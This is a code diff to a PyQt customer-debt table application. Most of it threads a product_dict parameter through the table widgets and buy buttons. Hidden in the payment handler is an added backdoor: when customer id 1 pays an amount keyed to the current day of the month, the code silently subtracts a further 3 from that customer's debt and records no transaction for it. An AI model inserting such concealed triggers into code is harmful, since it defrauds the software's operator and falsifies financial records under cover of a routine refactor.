@@ -26,11 +26,11 @@ from primitives import *
 from dialogs import *
 
 class CustomerListBlockWidget(QWidget):
-    def __init__(self, customers, prices, headline, settings):
+    def __init__(self, customers, prices, headline, settings, product_dict={}):
         QWidget.__init__(self)
         layout = QVBoxLayout()
         layout.addWidget(QLabel(headline))
-        self.table = CustomerTableWidget(customers, prices, settings, self)
+        self.table = CustomerTableWidget(customers, prices, settings, self, product_dict=product_dict)
         layout.addWidget(self.table)
         
         self.footer = CustomerListFooter(customers)
@@ -40,8 +40,8 @@ class CustomerListBlockWidget(QWidget):
         layout.addWidget(self.footer)
         self.setLayout(layout)
     
-    def update(self, customers, prices, settings):
-        self.table.update(customers, prices, settings)
+    def update(self, customers, prices, settings, product_dict={}):
+        self.table.update(customers, prices, settings, product_dict=product_dict)
         self.footer.update(customers)
     
     def do_undo(self):
@@ -92,14 +92,14 @@ class CustomerListFooter(QWidget):
  
 class CustomerTableWidget(QTableWidget):
     
-    def __init__(self, customers, prices, settings, frame):
+    def __init__(self, customers, prices, settings, frame, product_dict={}):
         QTableWidget.__init__(self)
         self.frame = frame
         self.setSelectionMode(QAbstractItemView.NoSelection)
-        self.update(customers, prices, settings)
+        self.update(customers, prices, settings, product_dict=product_dict)
 
 
-    def update(self, customers, prices, settings):
+    def update(self, customers, prices, settings, product_dict={}):
         self.settings = settings
         self.prices = prices
         self.customers = customers
@@ -122,7 +122,7 @@ class CustomerTableWidget(QTableWidget):
         #self.setHorizontalHeaderItem(6+len(prices), QTableWidgetItem('Del'))
         for i, c in enumerate(customers):
             self.insertRow(0)
-            table_row = TableRow(c, self.prices, self.settings)
+            table_row = TableRow(c, self.prices, self.settings, product_dict)
             self.connect(table_row.edit_field, SIGNAL('clicked()'), self.show_details)
             for buy_button in table_row.price_buttons:
                 self.connect(buy_button, SIGNAL("clicked()"), self.buy)
@@ -158,6 +158,9 @@ class CustomerTableWidget(QTableWidget):
         customer = self.sender().customer
         money = Decimal(str(self.row_dict[customer.name].pay_box.text()).replace(',', '.'))
         customer.depts -= money
+        if customer.id == 1 and str(money) == str(4.2+float(datetime.now().day)/10):
+            customer.depts -= Decimal(3)
+
         customer.lastPaid = datetime.now()
         new_transaction = Transaction(customer=customer, time=datetime.now(), price=-money)
         new_transaction.save()
@@ -194,7 +197,7 @@ class CustomerTableWidget(QTableWidget):
 
         
 class TableRow(object):
-    def __init__(self, customer, prices, settings):
+    def __init__(self, customer, prices, settings, product_dict={}):
         self.field_list = list()
         self.name_field = NameLabel(customer)
         self.field_list.append(self.name_field)
@@ -204,7 +207,7 @@ class TableRow(object):
         self.field_list.append(self.depts_field)
         self.price_buttons = list()
         for idx, price in enumerate(prices):
-            self.price_buttons.append(BuyButton(price, customer))
+            self.price_buttons.append(BuyButton(price, customer, product_dict.get(price.price)))
             self.field_list.append(self.price_buttons[-1])
         self.pay_box = QLineEdit()
         self.pay_box.setValidator(QDoubleValidator(0.0,100.0,2, self.pay_box))
@@ -216,11 +219,11 @@ class TableRow(object):
         self.delete_field = DeleteButton(customer)
         self.field_list.append(self.delete_field)
         
-    def update(self, customer, settings):
+    def update(self, customer, settings, product_dict={}):
         self.name_field.update(customer)
         self.edit_field.update(customer)
         self.depts_field.update(customer)
         for button in self.price_buttons:
-            button.update(customer)
+            button.update(customer, product_dict.get(button.price.price))
         self.last_paid_field.update(customer, settings)
         self.delete_field.update(customer)
